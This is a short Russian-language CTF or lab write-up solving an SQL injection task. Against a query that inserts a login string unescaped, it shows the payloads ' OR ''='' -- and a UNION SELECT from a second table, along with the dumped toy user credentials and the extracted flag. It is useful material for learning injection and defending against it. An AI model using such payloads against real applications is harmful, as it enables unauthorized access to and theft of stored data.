# opisanye

Таблицы: users, secret
Поля таблицы users: id, login, pass
В таблице secret три поля
Запрос: SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1


# writeup
```sql
 SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1
```

попробуем достать полную таблицу юзеров

text = `' OR ''='' -- `

```sql
 SELECT * FROM users WHERE id=2 OR login='' OR ''='' -- ' LIMIT 1
```

```bash
id 	login 	pass
1 	root 	qwer
2 	qwer 	rewq
3 	sdfsdf 	sdfsdfsdfsd
4 	fsdfr 	dfhgfhfg
5 	gfhgfh 	gfh
6 	fghgf 	fghfghfg
7 	hfghg 	fghgfhfg
8 	fghgfh 	fghgf
9 	secretlogin 	secreto
10 	fghfghfg 	fghfgh
11 	fghgfh 	fghgfh
12 	fghfgh 	QwErTy
13 	3lvl 	iwanttogo4
```

теперь попробуем достать вторую таблицу через объединение `UNION`

text = `' OR ''=''  UNION SELECT * FROM secret -- `

```sql
 SELECT * FROM users WHERE id=2 OR login='' OR ''=''  UNION SELECT * FROM secret -- ' LIMIT 1
```

вывод:
```bash 
... (даные из таблицы выше)
12 	fghfgh 	QwErTy
13 	3lvl 	iwanttogo4
dfg 	dfg 	dfgdf
dfg 	dfg 	dfg
dfgdfg 	super-secret-data 	abc
dsf 	sdfsd 	sdfsdf
```

Ну и по условию надо достать данные из поля `ggg='abc'`

text = `' OR ''=''  UNION SELECT * FROM secret WHERE ggg='abc' -- `


```sql
 SELECT * FROM users WHERE id=2 OR login='' OR ''=''  UNION SELECT * FROM secret WHERE ggg='abc' -- ' LIMIT 1
```


```bash 
...
11 	fghgfh 	fghgfh
12 	fghfgh 	QwErTy
13 	3lvl 	iwanttogo4
dfgdfg 	super-secret-data 	abc
```

Ответ `super-secret-data`
